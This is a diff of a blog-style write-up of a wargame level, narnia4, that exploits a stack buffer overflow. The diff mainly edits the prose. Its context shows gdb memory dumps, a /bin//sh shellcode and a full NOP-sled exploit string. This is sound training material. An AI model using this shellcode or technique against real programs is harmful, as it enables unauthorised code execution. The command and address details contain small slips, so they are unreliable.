@@ -668,16 +668,16 @@ int main&lt;span class="o"&gt;(&lt;/span&gt;int argc,char **argv&lt;span class="
 &lt;p&gt;This binary does three things: first, it creates a buffer array of size 256, then it makes all of the system environment variables equal to zero, and then it copies whatever user input it had to the buffer.&lt;/p&gt;
 &lt;p&gt;The reason why this code clears  the environment variables is to avoid the possibility of us placing a shellcode exploit to them  (like we did in the Level 2).&lt;/p&gt;
 &lt;h3&gt;Step 2: Outlining the Attack&lt;/h3&gt;
-&lt;p&gt;To exploit this binary we are going to overwrite our &lt;strong&gt;return address&lt;/strong&gt; like in the level 2, but this time we can't use some variable to point it to our exploit. However, since our Stack us executable, we can place the shellcode in the Stack. The steps we follow are:&lt;/p&gt;
+&lt;p&gt;To exploit this binary we are going to overwrite our &lt;strong&gt;return address&lt;/strong&gt; like in  level 2, but this time we can't use an external address to point to. However, since our Stack is executable, we can place the shellcode in the Stack. The steps we follow are:&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;Find out the size of the Stack. Only the return address won't matter there since we can't point it to anywhere outside the code.&lt;/li&gt;
-&lt;li&gt;Create a shell code with the return address minus some value we define so that the return address points to somewhere inside the stack.&lt;/li&gt;
-&lt;li&gt;Fill the beginning of the Stack with a lots of &lt;a href="http://en.wikipedia.org/wiki/NOP"&gt;NOPs&lt;/a&gt; (No Operations), which in the x86 CPU family is represented with &lt;code&gt;0x90&lt;/code&gt;. If the pointer hits these places, it just keep advancing until it finds our shell.&lt;/li&gt;
-&lt;li&gt;To make everything to fit right in the Stack frame, we pad the end of the shell code with junk.
+&lt;li&gt;Find out the size of the Stack.  Just having the return address won't help  since we can't point it to anywhere outside the code.&lt;/li&gt;
+&lt;li&gt;Create a shellcode with the return address minus some value we define so that the return address points to somewhere inside the Stack.&lt;/li&gt;
+&lt;li&gt;Fill the beginning of the Stack with a lots of &lt;a href="http://en.wikipedia.org/wiki/NOP"&gt;NOPs&lt;/a&gt; (No Operations), which in the x86 CPU family is represented with &lt;code&gt;0x90&lt;/code&gt;. If the pointer hits these places, it just keeps advancing until it finds our shell.&lt;/li&gt;
+&lt;li&gt;To make everything fit right in the Stack frame, we pad the end of the shell code with junk.
 .&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3&gt;Step 3: Getting the Frame Size&lt;/h3&gt;
-&lt;p&gt;With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag &lt;code&gt;-args&lt;/code&gt; because otherwise we will get a complain that the name is too long:&lt;/p&gt;
+&lt;p&gt;With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag &lt;code&gt;--args&lt;/code&gt; because otherwise we will get an error that the name is too long:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia4@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;gdb --args  narnia4 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print &amp;#39;A&amp;#39;*256&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
 Reading symbols from /games/narnia/narnia4...&lt;span class="o"&gt;(&lt;/span&gt;no debugging symbols found&lt;span class="o"&gt;)&lt;/span&gt;...done.
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
@@ -710,7 +710,7 @@ Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now, let's take a look where the frame, starts:&lt;/p&gt;
+&lt;p&gt;We see that the frame starts at &lt;strong&gt;0xffffd4cc&lt;/strong&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/90xw &lt;span class="nv"&gt;$esp&lt;/span&gt;
 0xffffd4a0: 0xffffd4cc  0xffffd7be  0x00000021  0xf7ff7d54
 0xffffd4b0: 0xf7e2ae38  0x00000000  0x00000026  0xffffffff
@@ -738,7 +738,7 @@ Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Taking a look at the information of the frame, gives us the return address with the address &lt;strong&gt;0xffffd4cc&lt;/strong&gt; from above, we find the size of the Stack:&lt;/p&gt;
+&lt;p&gt;Taking a look at the information of the frame gives us the return address, from which we find the size of the Stack:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; i f
 Stack level 0, frame at 0xffffd5e0:
  &lt;span class="nv"&gt;eip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x80484fa in main; saved eip 0xf7e404b3
@@ -752,10 +752,9 @@ Stack level 0, frame at 0xffffd5e0:
 
 
 &lt;h3&gt;Step 4: Writing and Applying the Exploit&lt;/h3&gt;
-&lt;p&gt;We know that the Stack has size of 272 bytes and that the return address is &lt;strong&gt;0xffffd5dc&lt;/strong&gt;.  The stack plus the return address sum to 276.&lt;/p&gt;
-&lt;p&gt;Now we have some freedoom to choose where to place our shellcode. Let's say, we place somewhere in the middle, say at the position 134. The position
-in the memory will be &lt;code&gt;0xffffd5cc - 134 = 0xffffd546&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Since 276 minus 134 is 142, if we give the return address the  address &lt;strong&gt;0xffffd546&lt;/strong&gt;, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.&lt;/p&gt;
+&lt;p&gt;We know that the Stack has size of 272 bytes and that the return address is &lt;strong&gt;0xffffd5dc&lt;/strong&gt;.  If we add the return address, it sums to 276.&lt;/p&gt;
+&lt;p&gt;Now we have some freedom to choose where to place our shellcode. Let's say, we place it somewhere in the middle, say, at the position 134. In the memory, we get: &lt;code&gt;0xffffd5cc - 134 = 0xffffd546&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since 276 minus 134 is 142, if we point the return address to   &lt;strong&gt;0xffffd546&lt;/strong&gt;, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.&lt;/p&gt;
 &lt;p&gt;We will borrow the shellcode from the previous levels, which has size of 25 bytes:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x31&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xc0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x73&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x62&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x69&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x6e&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe3&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe2&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe1&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xb0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x0b&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xcd&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x80&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -766,7 +765,7 @@ in the memory will be &lt;code&gt;0xffffd5cc - 134 = 0xffffd546&lt;/code&gt;.&lt
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We could have used another address to start our exploit too, and then we would just adjust our NOPs and our paddings. For example, &lt;code&gt;0xffffd5cc - 120 = 0xffffd554&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;We could have used another address to craft another version of the exploit. Then we would have to simply adjust our NOPs and our paddings. For example, &lt;code&gt;0xffffd5cc - 120 = 0xffffd554&lt;/code&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
